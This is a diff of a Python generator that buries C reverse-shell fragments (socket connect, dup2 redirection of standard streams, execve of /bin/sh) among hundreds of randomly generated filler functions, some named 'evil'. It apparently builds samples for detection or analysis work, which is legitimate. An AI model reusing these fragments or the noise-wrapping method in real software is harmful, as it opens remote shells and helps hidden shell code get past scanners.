@@ -1,5 +1,10 @@
 #!/usr/bin/env python
-import sys, random, os
+import sys, random, os, re
+
+open_file_seq = [
+'  %replace_val_name = fopen("/tmp/flag.txt", "w");',
+'  fclose(%replace_val_name);',
+]
 
 exp_seq = ["""
   int scktd;
@@ -25,6 +30,30 @@ exp_seq = ["""
   syscall(59,"/bin/sh",NULL,NULL);
 """]
 
+tcp_seq = ["""
+  int scktd;
+  struct sockaddr_in client;
+""",
+"""
+  client.sin_family = AF_INET;
+  client.sin_addr.s_addr = inet_addr("127.0.0.1");
+  client.sin_port = htons(8080);
+""",
+"""
+  scktd = syscall(41,2,1,0);
+""",
+"""
+  connect(scktd,(struct sockaddr *)&client,sizeof(client));
+""",
+"""
+  dup2(scktd,0); // STDIN
+  dup2(scktd,1); // STDOUT
+  dup2(scktd,2); // STDERR
+""",
+"""
+  syscall(59,"/bin/echo",NULL,NULL);
+"""]
+
 exp_seq_args = [
     '',
     'struct sockaddr_in client',
@@ -33,6 +62,17 @@ exp_seq_args = [
 exp_seq_ret = [
 
 ]
+
+def gen_access_file(max_deep, cur_deep):
+    if max_deep <= cur_deep: return ""
+    #print(code_block(max_deep, 0))
+    name = def_var_type('FILE*', 'file_')
+    ret = '  ' * cur_deep + 'FILE* ' + name + ';\n'
+    ret += code_block(max_deep, cur_deep)
+    ret += seq_to_code(open_file_seq).replace('%replace_val_name', name) + '\n'
+    ret += code_block(max_deep, cur_deep)
+    return ret 
+    #print(seq_to_code(exp_seq))
 
 def density_decreased(codeblock):
     codeblock = codeblock.split('\n')
@@ -62,9 +102,9 @@ def clear_var():
     var_count = 0
     scope = 0
 
-def def_var_type(set_type):
+def def_var_type(set_type, prefix=''):
     global var_count
-    name = 'var' + str(var_count)
+    name = prefix + 'var' + str(var_count)
     var_count += 1
     defined_var[name] = scope
     return name
@@ -75,12 +115,17 @@ def gen_def_int(cur_deep):
     return '  ' * cur_deep + set_type + ' ' + def_var_type(set_type) + ' = {};\n'.format(init)
 
 def check_and_gen(max_deep, cur_deep):
-    if not defined_var:
+    if not get_only_int():
         return gen_def_var(max_deep, cur_deep)
     return ''
 
+def get_only_int():
+    filered = list(defined_var.keys())
+    filered = [var for var in filered if not re.search(r'file', var)]
+    return(filered)
+
 def get_int_name():
-    return random.choice(list(defined_var.keys()))
+    return random.choice(get_only_int())
 
 def gen_def_var(max_deep, cur_deep):
     return gen_def_int(cur_deep)
@@ -160,7 +205,7 @@ def for_gen(max_deep, cur_deep):
     code_block(max_deep, cur_deep)
 
 def get_random_func():
-    funcs = [gen_call_var, if_gen, gen_def_var, gen_assign_var]
+    funcs = [gen_call_var, if_gen, gen_def_var, gen_assign_var, gen_access_file]
     select = random.choice(funcs)
     return select
 
@@ -186,6 +231,8 @@ def gen_call_var(max_deep, cur_deep):
         'system("echo hi")',
         'system("echo 127.0.0.1")',
         'system("echo 8080")',
+        'puts("hello world")',
+        'puts("nc")'
         #'execl("/bin/echo","echo","123",NULL,NULL);'
     ]
 
@@ -227,10 +274,18 @@ def gen_func(func_name, ret_type, main_func=False):
     print('}\n')
 
 header()
-for i in range(random.randint(4, 20)):
+for i in range(200):
     random_gen_func()
 
-gen_func_from_seq('main', 'int', exp_seq, True)
+# gen_func_from_seq('main', 'int', exp_seq, True)
+
+for i in range(20):
+    gen_func_from_seq('evil{}'.format(i), 'int', exp_seq)
+
+#for i in range(20):
+#    gen_func_from_seq('open_tcp{}'.format(i), 'int', tcp_seq)
+
+gen_func('main', 'int', True)
 
 
 
